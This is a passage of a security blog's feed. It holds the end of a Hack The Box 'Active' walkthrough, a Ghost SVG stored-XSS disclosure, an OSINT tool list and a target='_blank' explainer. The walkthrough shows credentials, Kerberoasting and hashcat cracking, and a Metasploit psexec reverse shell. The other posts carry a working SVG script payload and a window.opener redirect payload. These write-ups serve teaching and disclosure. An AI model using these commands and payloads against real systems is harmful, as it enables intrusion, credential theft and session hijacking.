&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;However, it looks like this user doesn’t have administrator privileges so psexec is not possible.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] 10.10.10.100:445 - Connecting to the server...
[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'SVC_TGS'...
[-] 10.10.10.100:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode STATUS_ACCESS_DENIED
[*] Exploit completed, but no session was created.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Enumeration the shares again using smbmap, the users share seems to be accessible&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	NO ACCESS
	NETLOGON                                          	READ ONLY
	Replication                                       	READ ONLY
	SYSVOL                                            	READ ONLY
	Users                                             	READ ONLY
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Enumeration of the SVC_TGS user directories revealed that the user.txt is stored within the user’s desktop.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -r Users\\SVC_TGS\\Desktop
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions
	----                                                  	-----------
	Users                                             	READ ONLY
	.SVC_TGS\Desktop                                   
	dr--r--r--                0 Sat Jul 21 11:14:42 2018	.
	dr--r--r--                0 Sat Jul 21 11:14:42 2018	..
	fr--r--r--               34 Sat Jul 21 11:14:42 2018	user.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This can be fetched to get the user token for this machine: &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt -q&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;bloodhound&quot;&gt;BloodHound&lt;/h3&gt;

&lt;p&gt;Some references on how to use BloodHound can be seen below.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;https://blog.cptjesus.com/posts/newbloodhoundingestor&lt;/li&gt;
  &lt;li&gt;https://thenoobsway.com/active-directory-reconnaissance-using-bloodhound/&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Since we have low privilege credentials, we could authenticate via LDAP and &lt;code class=&quot;highlighter-rouge&quot;&gt;ad-ldap-enum&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapdomaindump&lt;/code&gt; to look for interesting information. However, BloodHound is a better tool for this proces. Since we can’t psexec due to  &lt;code class=&quot;highlighter-rouge&quot;&gt;svc_tgs&lt;/code&gt; being a service account, runas can been used to start a shell as a low priv user. The following command can be used: &lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:active.htb\svc_tgs cmd&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/1.png&quot; alt=&quot;alt text&quot; title=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once that is completed, The BloodHound C# Ingestor “SharpHound” can be used to enumerate LDAP and gather all domain information: &lt;code class=&quot;highlighter-rouge&quot;&gt;.\SharpHound.exe -c all -d active.htb --DomainController&lt;/code&gt;. You will need to ensure that your DNS server configuration on your windows machine is pointing to 10.10.10.100.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/2.png&quot; alt=&quot;alt text&quot; title=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Importing the SharpHound results into BloodHound and by looking at the results, it looks like the administrator user is kerberoastable due to the user being configured with a SPN.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/3.png&quot; alt=&quot;alt text&quot; title=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Kerberoasting involves extracting a hash of the encrypted material from a Kerberos “Ticket Granting Service” ticket reply (TGS_REP), which can be subjected to offline cracking in order to retrieve the plaintext password. This is possible because the TGS_REP is encrypted using the NTLM password hash of the account in whose context the service instance is running.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/4.png&quot; alt=&quot;alt text&quot; title=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Impacket’s GetUserSPNs.py script can be used to request the TGS of the administrator account and extract the hash of this for offline cracking. This can be achieved using Hashcat: &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/htb/5.png&quot; alt=&quot;alt text&quot; title=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hashcat successfully cracked the hash using the rockyou.txt wordlist and the plaintext password of this hash can be seen below.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$373e34da642ae2f6fc55a66510e68ee7$9346f3dc8da4fa6b12e3fb663847fb755d729d12d55ca78f341056fd3d38845da008f17f0c08f35f13abd24bd51f4feb9febdcc1c2aa369f4c7d6ad42ce554570a45a933fdbc3f9d2f27be5c954cecd409863258da13af592cfa1765ab5b50fc566bcb4a68b1a00fce1a68d65b4d89a5ff93d1116744567370c052c1945dde973cbf610d5b257643fe4539b7f17d26b907aac87c9a4c493e8793c46eb6b1f8fdee32748261a17ecb6528ca343086109d515b731cc7cd020834df4bad5c47ff041995b4aaec1ca3a1063d47ceed63004ad25b824daff040539290567186632e7c611ee9a5519551d5968b077b944ee965d4de78927abe3bdfbd8b5d9061430904934d1fe44edf03100f63e64888a3268eb6c0ef66ef406dee14aa90ac0c8679ea7948ca2a9c5909aa054487be237017ad8dcf2c483bd750a35b67c813ef7998cde315d13d8429807c452dc865f134a2ba5a214f07594712f141a7f5af48d145e54d5e4c09d5942a29386f33a4773e3aa5dc3fa4fb271ee81e7daa3340339a44f2725a758cec4f7748727f7b018cab8dde4fbcefcbfab225d4ef910d863b6a4e37e039e0aff33825fd40be982e13946ee645ff72778fbe3c5fe10b695efb31bfca097afff3e1e0e8421fbd49334bab43017761293a2433b45aefc67f4abf809e0e3075b619f6b1e309924b6ae007632d9000c88038d547881787f5609398c810ca0a2d279a149df82759ddc59648a663ad8f764b45b915d170bf457f20e14a621f7ee4032bca48e9a0e2a2d6aa477e3e0375b7f4a2418aa0f6f5e06a2e2a307667eec40b6999fa6529a233f90092171ee09de00e6cc3b6f17f0a620c981bff474fed62d1f4211bce51fe28cae747ebaac12de512437aef20a05457051adec6ec65e649a570671360b107b3330b479af227910f9074f1abb26f7602a1821cff3b044c754909c8fbe164f69254bbcc8e6c2d026f9e973e364f7ad53b6b22c33a4fb1e8b7b8a5948133471172f9d4e01580b16105ee277a8136935f6be751753b1c8ea0bcd6b5d503884db5364b7485e4294935fc2129867b7918d17a56a4dacbda7f77f0dca04b1d6ccd0b5ded7f43f5721c9b22e37d07cea1c01caedf3a4324a7058452204baedf85d48cab02aeffc905aa054864fd128f2ca456d86ab0c97698df3fc3058233c95428d9c7ac54ed5aa603a4f21944576241f970ddd594d880372500bcffd677bde516ee75d18463dae717cef842de7bf7d9c03146:Ticketmaster1968
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4...c03146
Time.Started.....: Thu Jul  4 19:55:19 2019 (27 secs)
Time.Estimated...: Thu Jul  4 19:55:46 2019 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   394.9 kH/s (6.04ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tioncurtis23 -&amp;gt; Thelittlemermaid

Started: Thu Jul  4 19:55:09 2019
Stopped: Thu Jul  4 19:55:46 2019
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Using the password &lt;code class=&quot;highlighter-rouge&quot;&gt;Ticketmaster1968&lt;/code&gt;, psexec can be used to login to the system and get root.txt. &lt;code class=&quot;highlighter-rouge&quot;&gt;wmiexec&lt;/code&gt; from impacket and &lt;code class=&quot;highlighter-rouge&quot;&gt;pth-wmis&lt;/code&gt; can also be used instead of MetaSploit psexec.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &amp;gt; use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) &amp;gt; set RHOSTS 10.10.10.100
RHOSTS =&amp;gt; 10.10.10.100
msf5 exploit(windows/smb/psexec) &amp;gt; set SMBDomain active.htb
SMBDomain =&amp;gt; active.htb
msf5 exploit(windows/smb/psexec) &amp;gt; setg SMBUser Administrator
SMBUser =&amp;gt; Administrator
msf5 exploit(windows/smb/psexec) &amp;gt; setg SMBPass Ticketmaster1968
SMBPass =&amp;gt; Ticketmaster1968
msf5 exploit(windows/smb/psexec) &amp;gt; run

[*] Started reverse TCP handler on 10.10.14.41:4444 
[*] 10.10.10.100:445 - Connecting to the server...
[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'Administrator'...
[*] 10.10.10.100:445 - Selecting PowerShell target
[*] 10.10.10.100:445 - Executing the payload...
[+] 10.10.10.100:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (179779 bytes) to 10.10.10.100
[*] Meterpreter session 1 opened (10.10.14.41:4444 -&amp;gt; 10.10.10.100:57298) at 2019-07-04 20:15:59 -0400
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The root hash can be found within the Administrator’s desktop.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Administrator\Desktop&amp;gt;type root.txt
type root.txt
b5fc76d1d6b91d77b2fbf2d54d0f708b

C:\Users\Administrator\Desktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 28 Dec 2018 09:00:00 +0000</pubDate>
        <link>http://snoopysecurity.github.io/capture_the_flag/2018/12/28/htb-active-walkthrough.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/capture_the_flag/2018/12/28/htb-active-walkthrough.html</guid>
        
        
        <category>capture_the_flag</category>
        
      </item>
    
      <item>
        <title>Ghost Publishing Platform – SVG Image Upload to Stored Cross-site scripting</title>
        <description>&lt;p&gt;Often when looking for Stored Cross-site scripting (XSS) vulnerabilities, file upload functionalities can be targeted. This will include trying to upload an HTML file or a Flash SWF file that contains malicious JavaScript.  if it is possible successfully upload these file formats and view these stored files directly, then stored XSS is possible. 
Scalable Vector Graphics (SVG) file formats are often overlooked during this process. This short blog post will look at how SVG documents can be uploaded and leveraged to execute malicious JavaScript on a domain to achieve Stored XSS.
Scalable Vector Graphics (SVG).&lt;/p&gt;

&lt;p&gt;Scalable Vector Graphics (SVG) can be used to define vector-based graphics within a webpage. SVG can be mixed with HTML content, as well as XML namespaces. SVG can be used to create interactivity within a webpage and perform animations.
It should be noted that even though the MIME type for an SVG image is image/svg+xml. It is possible to store JavaScript code within an SVG document and execute it if viewed directly within a web browser. An example proof on concept for this can be seen below&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&amp;gt;
    &amp;lt;circle cx=&quot;50&quot; cy=&quot;50&quot; r=&quot;40&quot; stroke=&quot;black&quot; stroke-width=&quot;3&quot; fill=&quot;red&quot; /&amp;gt;
   &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
      alert(document.domain);
      alert(document.location);
   &amp;lt;/script&amp;gt;
&amp;lt;/svg&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The above SVG document can be saved as a .svg file and can be opened and viewed within any browser to execute JavaScript which will display the current domain and the full URL of the domain that the the JavaScript is executing from.&lt;/p&gt;

&lt;p&gt;It is also possible to embed the above SVG document as part of a HTML page and when rendered, will execute the specified JavaScript. However, it is not possible execute JavaScript through SVG by loading an externally stored SVG file. For example, the following ways cannot be used to execute JavaScript within a webpage.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;img src=&quot;https://snoopysecurity.github.io/test.svg&quot; alt=&quot;test&quot; &quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;However, in certain scenarios an &amp;lt;object&amp;gt; element can be used to load and embed an SVG document externally.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;object id=&quot;test&quot; data=&quot;https://snoopysecurity.github.io/test.svg&quot;&amp;gt;&amp;lt;/object&amp;gt;
&amp;lt;embed src=&quot;https://snoopysecurity.github.io/test.svg&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h3 id=&quot;ghost-publishing-platform&quot;&gt;Ghost Publishing Platform&lt;/h3&gt;
&lt;p&gt;Ghost is an open source publishing platform which allows a user to create public and private blogs. It was found that during creation of a new blog post, upload of SVG files as document was allowed by the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/snoopysecurity/Public/master/blog%20archive/1.png&quot; alt=&quot;alt text&quot; title=&quot;IMG 1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The below screenshot shows that an SVG file was successfully uploaded and rendered by the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/snoopysecurity/Public/master/blog%20archive/2.png&quot; alt=&quot;alt text&quot; title=&quot;IMG 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The image location of the stored SVG document can be visited to execute the stored JavaScript.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/snoopysecurity/Public/master/blog%20archive/3.png&quot; alt=&quot;alt text&quot; title=&quot;IMG 3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cross Site Scripting (XSS) allows clients to inject arbitrary scripting code into application and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, as form of an SVG file) and storing it without performing any validation or encoding.&lt;/p&gt;

&lt;p&gt;This vulnerability could potentially be leveraged by an editor or an author of a post to steal the session of an administrator.&lt;/p&gt;

</description>
        <pubDate>Thu, 20 Sep 2018 09:00:59 +0100</pubDate>
        <link>http://snoopysecurity.github.io/web_application_security/2018/09/20/ghost_svg_image_upload_to_xss.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/web_application_security/2018/09/20/ghost_svg_image_upload_to_xss.html</guid>
        
        
        <category>web_application_security</category>
        
      </item>
    
      <item>
        <title>Top 10 OSINT Tools/Sources for Security Folks</title>
        <description>&lt;p&gt;Open-source intelligence (OSINT) refers to techniques used to collect data from publicly available sources that can be used for enumeration or attacking a target further. This blog post will provide information on certain well-known OSINT tools and how they can be used to collection and analyse information.&lt;/p&gt;

&lt;h3 id=&quot;harpoon-an-osint--threat-intelligence-tool&quot;&gt;10 Harpoon: an OSINT / Threat Intelligence tool&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Te-k/harpoon&quot;&gt;Link: Harpoon: an OSINT / Threat Intelligence tool&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Harpoon is a quite recent addition to the OSINT field. Harpoon is a plugin-based tool and it can be used to search multiple services such as Malshare, Spyonweb, Certspotter, Binaryedge and Asn for data.  The tool is also organised in plugins which makes it easier to write plugins to perform useful tasks.  Furthermore, this tool seems more focused on threat hunting compared to bug bounty hunting and red teaming.&lt;/p&gt;

&lt;h3 id=&quot;binaryedge-software-as-a-service&quot;&gt;9 - BinaryEdge Software as a service&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.binaryedge.io/&quot;&gt;Link: BinaryEdge&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;BinaryEdge is a platform that gathers data and makes the accessible for a user through their API. This platform is similar to Shodan; and provides information regarding exposed ports/services, banner grabs, torrent information, DNS queries and much more. 
&lt;img src=&quot;https://www.binaryedge.io/img/products/datapoints.png&quot; alt=&quot;alt text&quot; title=&quot;BinaryEdge&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;hunterio&quot;&gt;8 Hunter.io&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://hunter.io/&quot;&gt;Link: Hunter.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;When targeting an organisation, services such as search engines (e.g. Google, Yahoo, Bing) can be used to search for email addresses associated with a domain that a target organization uses for their business. Tools such as &lt;strong&gt;linkedin2username&lt;/strong&gt; and &lt;strong&gt;ScrapedIn&lt;/strong&gt; can also be used  to scrape LinkedIn for potential targets without API restrictions for data reconnaissance&lt;/p&gt;

&lt;p&gt;Hunter.io can also be useful when trying to find email addresses related to a domain. The Hunter service is used for sales personnel to find contacts and leads for an organisation but this service can also be used to collect email addresses as well as names, job titles, and phone numbers.&lt;/p&gt;

&lt;h3 id=&quot;censysio&quot;&gt;7 Censys.io&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://censys.io/&quot;&gt;Link: Censys.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Censys is a service that scans the Internet searching for devices and return aggregate reports on how resources (i.e. Devices, websites, and certificates) are configured and deployed. This service also provides a search engine that can be used to search for this information.  Due to its feature of showing real-time data, this service can often be useful for bug bounty hunters to quickly map out easy targets.&lt;/p&gt;

&lt;p&gt;The below search is an example of looking for any service/server with its SSL/TLS certificate that can correlates to the search term “PayPal”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/snoopysecurity/Public/raw/master/blog%20archive/images/1.JPG&quot; alt=&quot;alt text&quot; title=&quot;Censys&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The above search utilises Certificate Transparency.  Certificate Transparency by design contains all the certificates issued by a participating CA for any given domain. Search engines such as &lt;strong&gt;crt.sh&lt;/strong&gt; also collects this data.&lt;/p&gt;

&lt;h3 id=&quot;open-source-intelligence-browser-extension&quot;&gt;6 Open Source Intelligence Browser Extension&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;http://www.osintbrowser.com&quot;&gt;Link: Open Source Intelligence Browser Extension&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The Open Source Intelligence Browser extension that can be used to quickly search for information by leveraging the Chrome browser. This extension can be useful during Intelligence (OSINT) Investigations. This includes username, telephone, domain and company searches.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://www.osintbrowser.com/img/screenshot.png&quot; alt=&quot;alt text&quot; title=&quot;http://www.osintbrowser.com&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;whatweb-scanner&quot;&gt;5 WhatWeb Scanner&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/urbanadventurer/WhatWeb&quot;&gt;Link: WhatWeb Scanner&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. WhatWeb has over 1700 plugins, each to recognise something different. WhatWeb also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.&lt;/p&gt;

&lt;p&gt;WhatWeb is a scanner that conducts web application fingerprinting. This technique often be useful for bug bounty hunters. WhatWeb contains over 1700 plugins which can be customised and used for fingerprinting and can be used to gather information on a variety of application servers including Content Management Systems, Application servers and web application dashboards.  An example of WhatWeb scanner in use can be seen below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./whatweb exampletargetsite.com/forum/
http://exampletargetsite.com/forum/ [200] PasswordField[password], HTTPServer[Apache/2.2.15], PoweredBy[phpBB], Apache[2.2.15], IP[88.198.177.36], phpBB[2], PHP[5.2.13], X-Powered-By[PHP/5.2.13], Cookies[phpbb2mysql_data,phpbb2mysql_sid], Title[Smartors Mods Forums - Reloaded], Country[GERMANY][DE]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;intrigueio&quot;&gt;4 Intrigue.io&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/intrigueio&quot;&gt;Link: Intrigue.io&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Intrigue.io is a framework that was created for automated attack surface discovery. This framework can be used for port scanning, service discovery, DNS recon as well as search for third party services such as Pastebin, Github etc. Intrigue.io also contains a web interface which can be used to quickly configure and start automated discovery scans. Intrigue.io can also be used as a Vagrant or docker container.  I prefer to use Aquatone these days for attack surface discovery&lt;/p&gt;

&lt;h3 id=&quot;aquatone&quot;&gt;3 Aquatone&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/michenriksen/aquatone&quot;&gt;Link: Aquatonet&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Aquatone is a well-supported and updated tool that can be used to scan large number of hosts and quickly get information regarding an organization’s attack surface. Aquatone has several features including DNS enumeration, port scanning, as well as screenshotting and reporting. Aquatone can also be easily integrated with existing toolsets with minimal effort.&lt;/p&gt;

&lt;h3 id=&quot;recon-ng&quot;&gt;2 Recon-Ng&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://bitbucket.org/LaNMaSteR53/recon-ng/&quot;&gt;Link: Recon-ng&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Recon-Ng is an extremely powerful web reconnaissance framework which can be used by security consultants to gather OSINT data quickly. Recon-Ng follows a modular approach similar to the MetaSploit framework, and also provides useful usability features such as interactive help, and command completion.  Recon-Ng contains numerous modules including DNS, Email and Web application reconnaissance. Numerous bug bounty scripts/wrappers have utilised Recon-Ng in the past including &lt;strong&gt;enumall.py&lt;/strong&gt; by @Jhaddix.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.darknet.org.uk/wp-content/uploads/2016/04/recon-ng.png&quot; alt=&quot;alt text&quot; title=&quot;recon-ng&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;spiderfoot&quot;&gt;1 SpiderFoot&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://www.spiderfoot.net/&quot;&gt;Link: SpiderFoot&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;SpiderFoot is an open source intelligence (OSINT) reconnaissance tool that can be used to gather IP addresss, domain names, hostnames, network subnets, ASNs, e-mail addresses of a given search name.  SpiderFoot can be used to query over 100 public data sources (OSINT) and is updated monthly with updates.  SpiderFoot can also be configured with public data source APIs; a full list of documentation can be found here: https://www.spiderfoot.net/documentation/&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://www.spiderfoot.net/images/spiderfoot-browse.png&quot; alt=&quot;alt text&quot; title=&quot;SpiderFoot&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;concluding-thoughts&quot;&gt;Concluding thoughts&lt;/h3&gt;
&lt;p&gt;Most of these tools can be used to gather port scan information, search engine dorks, python scripting, passive DNS, Threat intelligence, data visualization, Social Media, SSL/TLS certificates, WHOIS, Autonomous System (AS) Numbers, Cloud information, Wayback Machine, Web crawling, mail exchange information and much more. These are a few tools I use on a regular basis.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Honourable mentions&lt;/strong&gt;: Wapplyzer, Trape, EagleEye, RiskIQ, Skiptracer, Sn1per, Dnsdumpster, Gitrob&lt;/p&gt;

</description>
        <pubDate>Thu, 02 Aug 2018 10:00:00 +0100</pubDate>
        <link>http://snoopysecurity.github.io/osint/2018/08/02/10_OSINT_for_security_folks.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/osint/2018/08/02/10_OSINT_for_security_folks.html</guid>
        
        
        <category>OSINT</category>
        
      </item>
    
      <item>
        <title>The target=&quot;_blank&quot; Vulnerability</title>
        <description>&lt;p&gt;The HTML &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a&amp;gt;&lt;/code&gt; element, also known as anchor element is used within webpages to create an hyperlink to another resource. The anchor tag can also be specified with several attributes, one of them being the target attribute. An example can be seen below. Usage of certain attributes can often introduce vulnerabilities in a web application.&lt;/p&gt;

&lt;p&gt;Example Link:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;a href=&quot;https://snoopysecurity.github.io/test.html&quot; target=&quot;_blank&quot;&amp;gt;Click Here&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The target attribute specifies the context in where the linked resource will open when the it is clicked by a user. The target attribute supports many values such as &lt;code class=&quot;highlighter-rouge&quot;&gt;_blank&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;_parent&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;_top&lt;/code&gt;. The most interesting of these values is the “_blank” value. If the target attribute is used with the “_blank” value, the resource used as link will open in a new tab, or a new window in older browsers.&lt;/p&gt;

&lt;p&gt;However, it was discovered a while back that a link opened via target blank attribute can make changes to the original page, essentially bypassing same origin policy restrictions. An example of this are as follows.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://pste.eu/p/N2ad.html&quot; target=&quot;_blank&quot;&gt;Click Here for a POC&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Clicking the above link will take you to a webpage with the following JavaScript code:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;
window.opener.location = 'https://media.makeameme.org/created/hacked.jpg';
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;In the above code, the &lt;code class=&quot;highlighter-rouge&quot;&gt;window.opener.location&lt;/code&gt; property is used to redirect a user from the initial clicked webpage to an attacker controlled webpage. This could be leveraged to conduct phishing attacks on the initial webpage since the window.opener object has access to the page from where the user clicked the link. However, it should be noted that it is not possible to execute JavaScript on the initial page since the window.opener object only has partial access (TLDR: you can only control the location attribute of the window object so only redirection is possible).&lt;/p&gt;

&lt;p&gt;To make detection of this vulnerability easier, I wrote a Burp Plugin which can be found here: &lt;a href=&quot;https://github.com/snoopysecurity/Noopener-Burp-Extension&quot; target=&quot;_blank&quot;&gt;https://github.com/snoopysecurity/Noopener-Burp-Extension&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The following article also shows a real-world example of this vulnerability: 
&lt;a href=&quot;https://dev.to/ben/the-targetblank-vulnerability-by-example&quot; target=&quot;_blank&quot;&gt;https://dev.to/ben/the-targetblank-vulnerability-by-example&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;To prevent pages from abusing this vulnerability, the “noopener” and “noreferrer” attribute can be used. An example of this is shown below:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;a href=&quot;http://snoopysecurity.github.io&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&amp;gt;Click Me&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;For older browsers, The “noreferrer” attribute will need to be used since certain browsers such as Firefox doesn’t support the “noopener” attribute.&lt;/p&gt;

&lt;h5 id=&quot;references&quot;&gt;References&lt;/h5&gt;
&lt;ul&gt;
  &lt;li&gt;https://mathiasbynens.github.io/rel-noopener/&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Thu, 26 Apr 2018 09:43:59 +0100</pubDate>
        <link>http://snoopysecurity.github.io/web_application_security/2018/04/26/target_blank_vulnerability.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/web_application_security/2018/04/26/target_blank_vulnerability.html</guid>
        
        
        <category>web_application_security</category>
        
      </item>
    
      <item>
        <title>Introduction to Socat</title>
        <description>&lt;p&gt;Socat is a network swiss army knife utility and it is very similar to Netcat. However, Socat has many additional features that makes it a better alternative to Netcat. Socat also has advanced features such as listeners for multiple clients, different protocols, reusing connections, connection redirection etc. The following are some few examples of how to use Socat and how it can be a very useful tool during assessments.&lt;/p&gt;

